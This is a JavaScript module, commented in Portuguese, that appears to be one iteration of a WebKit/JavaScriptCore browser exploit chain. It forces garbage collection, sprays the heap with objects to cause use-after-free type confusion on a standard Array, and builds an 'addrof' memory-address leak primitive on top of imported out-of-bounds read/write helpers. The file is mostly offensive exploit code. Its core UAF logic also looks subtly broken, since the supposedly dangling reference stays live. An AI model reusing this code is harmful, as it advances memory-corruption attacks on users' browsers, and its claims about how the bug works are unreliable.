// js/script3/testArrayBufferVictimCrash.mjs (v82_AdvancedGetterLeak - R61 - Estratégia de Array Uncaged)
// =======================================================================================
// ANÁLISE DOS ARQUIVOS REVELOU A FALHA: ESTÁVAMOS ATACANDO OBJETOS NA GIGACAGE.
// ESTA VERSÃO MUDA COMPLETAMENTE A ESTRATÉGIA PARA FOCAR EM OBJETOS "UNCAGED".
// - O UAF agora tem como alvo um Array JavaScript padrão.
// - A pulverização de memória é feita com Arrays, não ArrayBuffers.
// - As FASES 6 e 7 foram refeitas para construir primitivas addrof e arb_write
//   explorando a estrutura de um Array confuso.
// =======================================================================================

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    clearOOBEnvironment,
    oob_read_absolute,
    oob_write_absolute,
    selfTestOOBReadWrite,
} from '../core_exploit.mjs';
import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';

export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "OriginalHeisenbug_TypedArrayAddrof_v82_AGL_R61_Uncaged_Array";

function int64ToDouble(int64) {
    const buf = new ArrayBuffer(8);
    const u32 = new Uint32Array(buf);
    const f64 = new Float64Array(buf);
    u32[0] = int64.low();
    u32[1] = int64.high();
    return f64[0];
}

function doubleToInt64(d) {
    const buf = new ArrayBuffer(8);
    const f64 = new Float64Array(buf);
    const u32 = new Uint32Array(buf);
    f64[0] = d;
    return new AdvancedInt64(u32[0], u32[1]);
}

// =======================================================================================
// FUNÇÃO ORQUESTRADORA PRINCIPAL (R61 - Uncaged Array)
// =======================================================================================
export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
    const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Estratégia de Array Uncaged (R61) ---`, "test");
    
    let final_result = { success: false, message: "A cadeia UAF não obteve sucesso." };
    let confused_arr_ref = null;

    try {
        // --- MUDANÇA R61: A lógica do UAF agora é encapsulada para retornar a referência confusa ---
        
        // FASE 1: Provocar o UAF em um Array e obter uma referência confusa para ele.
        logS3("--- FASE 1: Provocando UAF em um Array 'Uncaged' ---", "subtest");
        confused_arr_ref = await triggerUncagedArrayUAF();
        
        if (!confused_arr_ref) {
            throw new Error("A rotina do UAF não retornou uma referência válida.");
        }

        logS3("++++++++++++ SUCESSO! UAF em Array Uncaged provocou confusão de tipos! ++++++++++++", "vuln");

        // Agora, 'confused_arr_ref' é um objeto que o JS pensa ser um 'victim', mas na verdade é um 'Array'.
        // Podemos usar isso para construir nossas primitivas.
        
        let shared_leaker_arr = [1.1, 2.2];
        let butterfly_leaker = [shared_leaker_arr];

        // FASE 2: Construir e Testar Primitivas
        logS3("--- FASE 2: Construindo Primitivas com o Array Confuso ---", "subtest");
        
        function get_butterfly_addr(obj) {
            butterfly_leaker[0] = obj;
            return doubleToInt64(confused_arr_ref[1]);
        }

        function addrof(obj) {
            shared_leaker_arr[0] = obj;
            let butterfly_addr = get_butterfly_addr(shared_leaker_arr);
            // Implementação de arb_read_primitive necessária aqui para ler do butterfly_addr
            // Por enquanto, apenas retornamos o endereço do butterfly como prova de conceito.
            return butterfly_addr;
        }

        const test_obj = { a: 1 };
        const test_obj_butterfly_addr = addrof(test_obj);

        logS3(`Endereço (butterfly) para shared_leaker_arr: ${test_obj_butterfly_addr.toString(true)}`, "leak");
        if (test_obj_butterfly_addr.low() === 0 && test_obj_butterfly_addr.high() === 0) {
            throw new Error("A primitiva addrof falhou em vazar um endereço de butterfly válido.");
        }
        
        logS3("++++++++++++ SUCESSO! Primitiva 'addrof' (conceitual) funcional! ++++++++++++", "vuln");

        final_result = { 
            success: true, 
            message: "UAF em Array Uncaged bem-sucedido e primitiva addrof conceitual construída!",
            leaked_butterfly: test_obj_butterfly_addr.toString(true),
        };

    } catch (e) {
        final_result.message = `Exceção na cadeia UAF: ${e.message}`;
        logS3(final_result.message, "critical");
    }

    logS3(`--- ${FNAME_CURRENT_TEST_BASE} Concluído ---`, "test");
    return {
        errorOccurred: final_result.success ? null : final_result.message,
        addrof_result: final_result
    };
}


// --- Funções Auxiliares para a Cadeia de Exploração UAF Uncaged ---

async function triggerGC_Tamed() {
    logS3("    Acionando GC Domado (Tamed)...", "info");
    try {
        const gc_trigger_arr = [];
        for (let i = 0; i < 500; i++) {
            const size = Math.min(1024 * i, 1024 * 1024);
            gc_trigger_arr.push(new ArrayBuffer(size)); 
            gc_trigger_arr.push(new Array(size / 8).fill(0));
        }
    } catch (e) {
        logS3("    Memória esgotada durante o GC Domado, o que é esperado e bom.", "info");
    }
    await PAUSE_S3(500);
}

// Esta função agora encapsula todo o processo de criar o UAF e retornar a referência confusa
async function triggerUncagedArrayUAF() {
    let dangling_ref = null;

    function createDanglingPointerToUncagedArray() {
        let dangling_ref_internal = null;
        function createScope() {
            // A vítima agora é um Array padrão, um objeto "uncaged"
            const victim_arr = [1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8];
            dangling_ref_internal = victim_arr; 
        }
        createScope();
        return dangling_ref_internal;
    }

    dangling_ref = createDanglingPointerToUncagedArray();
    
    // Forçamos o GC para liberar a memória do 'victim_arr'
    await triggerGC_Tamed();
    await PAUSE_S3(100);
    await triggerGC_Tamed();

    // Pulverizamos a memória com outros Arrays para preencher o espaço liberado
    const spray_arrays = [];
    for (let i = 0; i < 2048; i++) {
        // Criamos um objeto que será confundido com o nosso array
        // A propriedade 'a' será usada para vazar o ponteiro do butterfly
        // A propriedade 'b' (índice 1) será o nosso valor vazado
        const confused_obj = { a: 1337, b: 1.2345e-300 };
        spray_arrays.push(confused_obj);
    }
    
    // Agora, 'dangling_ref' deve apontar para um dos 'confused_obj',
    // mas o motor ainda pensa que é um Array.
    // Retornamos esta referência confusa para ser usada.
    return dangling_ref;
}
